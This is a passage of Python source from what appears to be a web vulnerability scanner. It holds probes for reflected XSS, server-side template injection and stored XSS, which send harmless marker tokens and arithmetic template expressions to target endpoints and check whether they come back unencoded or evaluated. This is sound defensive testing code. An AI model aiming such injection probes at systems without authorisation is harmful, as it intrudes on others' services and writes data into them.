        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"xss_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "xss", token)

    seen: set = set()
    reached = 0
    for e in cands[:8]:
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        for qp in list(e.get("query_params") or [])[:3]:
            if (path, qp) in seen:
                continue
            seen.add((path, qp))
            marker = f"<qax{uuid.uuid4().hex[:10]}>"
            try:
                r = sess.get(f"{base}{path}", params={qp: marker}, headers=headers, timeout=15)
            except Exception:
                continue
            reached += 1
            ct = str(r.headers.get("Content-Type", "")).lower()
            if "html" in ct and marker in (r.text or ""):
                out.append(ProbeFinding(
                    probe="xss",
                    title=f"Reflected XSS via query param '{qp}' on {e.get('path')}",
                    exploited=True, severity="P2",
                    evidence=(f"GET {e.get('path')} reflected the markup {marker} verbatim (unencoded) "
                              f"into an HTML response. Script in '{qp}' would execute in the victim's "
                              f"browser — the output is not HTML-encoded."),
                    target=str(e.get("path", ""))))
                break   # one proven param per endpoint is enough
    if not out and not reached:
        _unreached(sess, "xss", len(cands[:8]))
    return out


# Template-expression syntaxes across common engines (Jinja2/Twig, FreeMarker/JSP-EL, Razor).
_SSTI_SYNTAXES = ("{{%d*%d}}", "${%d*%d}", "#{%d*%d}")


def ssti_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    Server-side template injection (RCE-class). Inject a template expression into a GET
    query param and confirm the server EVALUATED it — not reflected it.

    Zero-false-positive control: the payload is an arithmetic expression with RANDOM
    factors (a distinctive 5–6-digit product unlikely to occur by chance). A hit counts
    only when the computed PRODUCT appears while the literal expression does NOT — and
    it is then re-confirmed with a SECOND, different random product on the same engine.
    A page that merely reflects input, or coincidentally contains one number, cannot
    produce two independent correct products. P1. No model calls.
    """
    import random
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and e.get("query_params")]
    if not cands:
        _no_candidates(sess, "ssti", "GET endpoint with query parameters")
        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"ssti_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "ssti", token)
    reached = [0]

    def render_of(path, qp, headers, expr):
        try:
            text = sess.get(f"{base}{path}", params={qp: expr}, headers=headers, timeout=15).text or ""
        except Exception:
            return ""
        reached[0] += 1
        return text

    seen: set = set()
    for e in cands[:8]:
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        for qp in list(e.get("query_params") or [])[:3]:
            if (path, qp) in seen:
                continue
            seen.add((path, qp))
            engine = None
            for fmt in _SSTI_SYNTAXES:
                a, b = random.randint(200, 999), random.randint(200, 999)
                expr, product = fmt % (a, b), str(a * b)
                body = render_of(path, qp, headers, expr)
                if product in body and expr not in body and f"{a}*{b}" not in body:
                    engine = fmt
                    break
            if not engine:
                continue
            # Re-confirm with a different product on the same engine (rule out coincidence).
            a2, b2 = random.randint(200, 999), random.randint(200, 999)
            expr2, product2 = engine % (a2, b2), str(a2 * b2)
            body2 = render_of(path, qp, headers, expr2)
            if product2 in body2 and expr2 not in body2:
                out.append(ProbeFinding(
                    probe="ssti",
                    title=f"Server-side template injection via query param '{qp}' on {e.get('path')}",
                    exploited=True, severity="P1",
                    evidence=(f"A template expression in '{qp}' on GET {e.get('path')} was EVALUATED "
                              f"server-side: {expr2} rendered as {product2} (and a prior expression "
                              f"rendered as {product}). The literal expression did not appear — user "
                              f"input reaches a template engine, which is typically RCE."),
                    target=str(e.get("path", ""))))
                break
    if not out and not reached[0]:
        _unreached(sess, "ssti", len(cands[:8]))
    return out


# ── stored XSS ────────────────────────────────────────────────────────────────
# Body fields that typically hold displayed free text.
_STORED_TEXT_KW = ("content", "comment", "message", "body", "text", "description", "desc",
                   "title", "bio", "review", "post", "note", "caption", "subject", "name")


def stored_xss_probe(model, base_url: str, *, session: requests.Session | None = None,
                     auth: dict | None = None) -> list[ProbeFinding]:
    """
    Stored (persistent) XSS (OWASP). Write a unique markup token `<qax…>` into a
    free-text field of a create endpoint, then read the collection back; confirm ONLY
    when the exact markup returns UNENCODED in an HTML response. Stored XSS is worse
    than reflected — it persists and fires for every viewer — so this is P1. The unique
    token written then read back is the control (near-zero false positives).
    """
    sess = session or requests.Session()
    from core.auth_recipe import field_names, nest_body, derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    writes = []
    for e in eps:
        if str(e.get("method", "")).upper() in ("POST", "PUT", "PATCH"):
            fields = field_names(e.get("request_fields"))
            # Test EACH text-ish field separately — some (e.g. username) are escaped while
            # another (e.g. content) is rendered raw; picking only the first would miss it.
            text_fields = [f for f in fields if any(k in str(f).lower() for k in _STORED_TEXT_KW)]
            if text_fields:
                writes.append((e, text_fields[:3], fields))
    reads = [e for e in eps if str(e.get("method", "")).upper() == "GET"]
    if not writes:
        _no_candidates(sess, "stored-xss", "write endpoint with a free-text field")
        return out
    if not reads:
        _no_candidates(sess, "stored-xss", "GET endpoint to read a stored value back from")
        return out

    token = None
    if any(e.get("auth_required") for e, _, _ in writes) or any(e.get("auth_required") for e in reads):
        token = _resolve_token(sess, base, recipe, model, f"sxss_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "stored-xss", token)
    reached = [0]
    html_seen = [0]

    def _read_has(marker):
        for re_ in reads[:20]:
            rpath = re.sub(r"\{[^}]+\}", "1", str(re_.get("path", "")))
            rheaders = _auth_headers(token, auth) if re_.get("auth_required") else {}
            try:
                r = sess.get(f"{base}{rpath}", headers=rheaders, timeout=15)
            except Exception:
                continue
            reached[0] += 1
            is_html = "html" in str(r.headers.get("Content-Type", "")).lower()
            html_seen[0] += 1 if is_html else 0
            if is_html and marker in (r.text or ""):
                return re_
        return None

    for we, text_fields, fields in writes[:4]:
        wpath = re.sub(r"\{[^}]+\}", "1", str(we.get("path", "")))
        method = str(we.get("method", "POST")).upper()
        wheaders = _auth_headers(token, auth) if we.get("auth_required") else {}
        done = False
        for field in text_fields:
            marker = f"<qax{uuid.uuid4().hex[:10]}>"
            body = {f: (marker if f == field else "qax") for f in fields} or {field: marker}
            for kw in ({"data": body}, {"json": nest_body(body)}):  # form or JSON
                try:
                    sess.request(method, f"{base}{wpath}", headers=wheaders, timeout=15, **kw)
                    reached[0] += 1
                except Exception:
                    pass
            hit = _read_has(marker)
            if hit:
                out.append(ProbeFinding(
                    probe="stored-xss",
                    title=f"Stored XSS: '{field}' from {method} {we.get('path')} rendered unencoded on {hit.get('path')}",
                    exploited=True, severity="P1",
                    evidence=(f"Markup {marker} written via '{field}' on {we.get('path')} came back verbatim "
                              f"(unencoded) in the HTML of {hit.get('path')}. Stored script executes for "
                              f"every viewer of that page."),
                    target=str(we.get("path", ""))))
                done = True
                break
        if done:
            continue
    if not out:
        if not reached[0]:
            _unreached(sess, "stored-xss", len(writes[:4]))
        elif not html_seen[0]:
            _skip(sess, "stored-xss", "no read endpoint returned an HTML page, so a stored-XSS sink in HTML "
                                      "could not be observed (a JSON-only API is not an HTML sink)",
                  kind="not-applicable")
    return out
